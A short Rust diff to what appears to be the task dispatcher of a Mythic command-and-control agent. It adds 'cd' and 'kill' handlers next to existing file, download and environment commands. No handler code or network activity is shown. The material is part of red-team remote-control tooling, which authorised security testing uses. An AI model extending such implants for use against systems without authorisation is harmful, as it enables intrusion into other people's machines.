@@ -1,5 +1,7 @@
 #[path = "commands/cat.rs"]
 mod cat;
+#[path = "commands/cd.rs"]
+mod cd;
 #[path = "commands/cp.rs"]
 mod cp;
 #[path = "commands/download.rs"]
@@ -8,6 +10,8 @@ mod download;
 mod env;
 #[path = "commands/exit.rs"]
 mod exit;
+#[path = "commands/kill.rs"]
+mod kill;
 #[path = "commands/ls.rs"]
 mod ls;
 #[path = "commands/mkdir.rs"]
@@ -41,10 +45,12 @@ use mythic::{TaskMessage, TaskResponse};
 pub fn dispatch(task: &TaskMessage) -> TaskResponse {
     match task.command.as_str() {
         "cat" => cat::handle(task),
+        "cd" => cd::handle(task),
         "cp" => cp::handle(task),
         "download" => download::handle(task),
         "env" => env::handle(task),
         "exit" => exit::handle(task),
+        "kill" => kill::handle(task),
         "ls" => ls::handle(task),
         "mkdir" => mkdir::handle(task),
         "mv" => mv::handle(task),
